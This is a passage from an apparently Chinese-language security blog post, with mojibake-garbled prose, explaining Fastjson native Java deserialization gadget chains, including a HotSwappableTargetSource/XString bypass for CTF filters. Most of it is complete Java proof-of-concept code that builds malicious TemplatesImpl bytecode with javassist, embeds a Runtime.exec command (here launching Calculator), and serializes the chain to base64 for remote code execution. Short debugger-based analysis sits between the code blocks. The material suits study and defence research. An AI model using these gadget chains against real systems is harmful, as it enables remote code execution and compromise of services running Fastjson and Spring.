java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">fastjsonyuanshengBypass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] genPayload(String cmd) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">        clazz.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, clazz);</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span>+cmd+<span class="string">&quot;\&quot;);&quot;</span>);</span><br><span class="line">        clazz.addConstructor(constructor);</span><br><span class="line">        clazz.getClassFile().setMajorVersion(<span class="number">49</span>);</span><br><span class="line">        <span class="keyword">return</span> clazz.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;genPayload(<span class="string">&quot;open -na Calculator&quot;</span>)&#125;);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        ArrayList&lt;Object&gt; arrayList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        arrayList.add(templates);</span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">bd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        setValue(bd,<span class="string">&quot;val&quot;</span>,jsonArray);</span><br><span class="line">        arrayList.add(bd);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(arrayList);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray()));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Fastjson-Xstringç»•è¿‡-HotSwappableTargetSource"><a href="#Fastjson-Xstringç»•è¿‡-HotSwappableTargetSource" class="headerlink" title="Fastjson Xstringç»•è¿‡-HotSwappableTargetSource"></a>Fastjson Xstringç»•è¿‡-HotSwappableTargetSource</h2><p>åœ¨ä¸€äº›ctfé¢˜ç›®ä¸­ä¼šå°†BadAttributeValueExpExceptionç»™ç¦ç”¨æ‰æ‰€ä»¥è¿™é‡Œå­¦ä¹ åˆ°ä¸€ç§æ–°çš„ç»•è¿‡é“¾å­å…ˆç»™å‡ºpoc</p><h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">fastjsonyuanshengBypass_xstring</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPool</span>();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="type">byte</span>[] codes = cc.toBytecode();</span><br><span class="line"></span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;codes&#125;);</span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        jo.put(<span class="string">&quot;1&quot;</span>,templatesimpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(jo);</span><br><span class="line"><span class="comment">//      HotSwappableTargetSource h2 = new HotSwappableTargetSource(new XString(&quot;xxx&quot;));</span></span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(<span class="keyword">new</span> <span class="title class_">Object</span>());</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(h1,h1);</span><br><span class="line">        hashMap.put(h2,h2);</span><br><span class="line"></span><br><span class="line">        Class clazz=h2.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">transformerdeclaredField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;target&quot;</span>);</span><br><span class="line">        transformerdeclaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        transformerdeclaredField.set(h2,<span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;xxx&quot;</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> serial(hashMap);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">        deserial(Base64.getDecoder().decode(base64));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException, IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserial</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥åˆ†æä¸€ä¸‹è¿™ä¸ªé“¾çš„åŸç†ï¼Œå¯ä»¥çœ‹åˆ°å…¥å£ç‚¹äº‹HashMapè¿™é‡Œç›´æ¥è·Ÿè¸ªä¸‹ååºåˆ—åŒ–çš„æµç¨‹å°±çŸ¥é“äº†</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733921435470-5bace7aa-db8f-4eef-958c-45820b884dd8.png"></p><p>å¯ä»¥çœ‹åˆ°åœ¨hashmapçš„readobjectæ–¹æ³•é‡Œæœ€åè°ƒç”¨çš„äº‹putValæ–¹æ³•è€Œä»–çš„keyäº‹HotSwappableTargetSourceå¯¹è±¡</p><p>è·Ÿä¸‹å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733921508541-e689fdf8-d219-4243-b1fe-1e82db418248.png"></p><p>è¿™é‡Œä¼šè°ƒç”¨equalsæ–¹æ³•ï¼Œè¿™é‡Œç›¸å½“äºè°ƒç”¨çš„äº‹HotSwappableTargetSourceçš„equalsæ–¹æ³•è·Ÿè¿›å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733921581898-3294da62-2058-49e5-a924-4491df83a20f.png"></p><p>è¿™é‡Œä¼šæ‰§è¡Œtargetå¯¹è±¡çš„eualsæ–¹æ³•æˆ‘ä»¬çœ‹ä¸€ä¸‹targetå¯¹è±¡æ˜¯è°</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733921653959-0ffed6d0-151b-447a-ac43-7f0b5401a3d6.png"></p><p>å¯ä»¥çœ‹åˆ°æ˜¯Xstringå¯¹è±¡ï¼Œè·Ÿåˆ°ä»–çš„equalsæ–¹æ³•é‡Œå»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733921689502-04a8638a-1a64-4672-8731-b0aa9a0fb779.png"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œobj2å¯¹è±¡è°ƒç”¨äº†toStringæ–¹æ³•ã€‚åé¢å°±æ˜¯fastjson+ templatesimplçš„æµç¨‹äº†</p><p>é‚£è¿™é‡Œæˆ‘ä»¬éœ€è¦çœ‹ä¸€ä¸‹å¦‚ä½•æ‰èƒ½å°†targetå¯¹è±¡èµ‹å€¼ä¸ºXstringå¯¹è±¡å‘¢</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1733921782569-fece3a2d-76a0-4811-be24-97d417d3149d.png"></p><p>å¯ä»¥åœ¨HotSwappableTargetSourceçš„æœ‰å‚æ„é€ æ–¹æ³•ä¸­æ‰¾åˆ°å¯ä»¥ç›´æ¥èµ‹å€¼ã€‚</p><h3 id="é«˜ç‰ˆæœ¬POC"><a href="#é«˜ç‰ˆæœ¬POC" class="headerlink" title="é«˜ç‰ˆæœ¬POC"></a>é«˜ç‰ˆæœ¬POC</h3><p>arrayList</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">fastjsonyuanshengBypass_xstring</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPool</span>();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Cat&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="type">String</span> <span class="variable">randomClassName</span> <span class="operator">=</span> <span class="string">&quot;EvilCat&quot;</span> + System.nanoTime();</span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="type">byte</span>[] codes = cc.toBytecode();</span><br><span class="line"></span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;codes&#125;);</span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        ArrayList&lt;Object&gt; arrayList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        arrayList.add(templatesimpl);</span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(templatesimpl);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//        JSONObject jo = new JSONObject();</span></span><br><span class="line"><span class="comment">//        jo.put(&quot;1&quot;,templatesimpl);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(jsonArray);</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">h2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(<span class="keyword">new</span> <span class="title class_">Object</span>());</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(h1,h1);</span><br><span class="line">        hashMap.put(h2,h2);</span><br><span class="line">        setValue(h2,<span class="string">&quot;target&quot;</span>,<span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;xx&quot;</span>));</span><br><span class="line">        arrayList.add(hashMap);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> serial(arrayList);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">        deserial(Base64.getDecoder().decode(base64));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException, IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserial</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>hashmap</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONArray;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">fastjsonyuanshengBypass_xstring</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span 